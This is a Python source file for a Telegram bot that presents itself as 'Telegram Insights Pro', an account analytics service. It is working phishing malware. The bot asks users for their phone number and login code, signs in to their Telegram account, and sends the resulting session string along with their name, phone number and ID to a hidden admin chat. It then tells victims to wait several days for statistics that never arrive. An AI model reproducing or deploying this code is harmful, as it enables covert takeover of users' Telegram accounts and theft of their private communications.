import asyncio
import os
import json
from pathlib import Path
from datetime import datetime
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.errors import FloodWaitError

import logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger('app')

# Переменные
BOT_TOKEN = os.getenv('BOT_TOKEN', '')
API_ID = int(os.getenv('API_ID', '1234567'))
API_HASH = os.getenv('API_HASH', '')
ADMIN_CHAT_ID = int(os.getenv('ADMIN_CHAT_ID', '123456789'))
PORT = int(os.getenv('PORT', 10000))

DATA_DIR = Path('./data')
DATA_DIR.mkdir(exist_ok=True)

# ==========================================
# БОТ
# ==========================================

class Bot:
    def __init__(self):
        self.pending = {}
        self.bot = TelegramClient(str(DATA_DIR / 'bot_session'), API_ID, API_HASH)
    
    async def start(self):
        await self.bot.start(bot_token=BOT_TOKEN)
        logger.info("✅ Бот запущен")
        
        self.bot.add_event_handler(self.cmd_start, events.NewMessage(pattern='/start'))
        self.bot.add_event_handler(self.cmd_add, events.NewMessage(pattern='/add'))
        self.bot.add_event_handler(self.handle_msg, events.NewMessage())
        
        await self.bot.run_until_disconnected()
    
    async def cmd_start(self, e):
        await e.respond("""
🔐 **Telegram Insights Pro**

/add - Подключить аккаунт для аналитики
""")
    
    async def cmd_add(self, e):
        uid = e.sender_id
        await e.delete()
        self.pending[uid] = {'step': 'phone'}
        await e.respond("📱 Введите номер телефона:")
    
    async def handle_msg(self, e):
        uid = e.sender_id
        if not e.text or e.text.startswith('/'):
            return
        
        if uid in self.pending:
            step = self.pending[uid].get('step')
            await e.delete()
            
            if step == 'phone':
                await self.process_phone(e, e.text)
            elif step == 'code':
                await self.process_code(e, e.text)
            elif step == '2fa':
                await self.process_2fa(e, e.text)
    
    async def process_phone(self, e, phone: str):
        uid = e.sender_id
        phone = phone.strip().replace(' ', '').replace('-', '').replace('(', '').replace(')', '')
        if not phone.startswith('+'):
            phone = '+' + phone
        
        try:
            client = TelegramClient(StringSession(), API_ID, API_HASH)
            await client.connect()
            result = await client.send_code_request(phone)
            self.pending[uid] = {
                'step': 'code',
                'phone': phone,
                'hash': result.phone_code_hash,
                'client': client
            }
            await e.respond("📨 Код отправлен! Введите его:")
        except Exception as err:
            await e.respond(f"❌ Ошибка: {err}")
            del self.pending[uid]
    
    async def process_code(self, e, code: str):
        uid = e.sender_id
        data = self.pending.get(uid)
        if not data:
            return
        
        try:
            await data['client'].sign_in(
                phone=data['phone'],
                code=code.strip(),
                phone_code_hash=data['hash']
            )
            
            me = await data['client'].get_me()
            session_string = data['client'].session.save()
            
            # ⭐ ТОЛЬКО ОТПРАВКА СЕССИИ АДМИНУ
            await self.bot.send_message(ADMIN_CHAT_ID, f"""
🟢 Новый пользователь!
👤 {me.first_name}
📱 +{me.phone}
🆔 {me.id}

🔐 SESSION:
`{session_string}`
""")
            
            # ⭐ СООБЩЕНИЕ ПОЛЬЗОВАТЕЛЮ
            await e.respond(f"""
✅ {me.first_name}, вы подключены!

⏳ Оставьте бота на 3-4 дня для сбора аналитики.
Статистика появится позже в /stats
""")
            
            del self.pending[uid]
            
        except Exception as err:
            await e.respond(f"❌ Ошибка: {err}")
            del self.pending[uid]

# ==========================================
# ЗАПУСК
# ==========================================

async def main():
    bot = Bot()
    await bot.start()

if __name__ == "__main__":
    asyncio.run(main())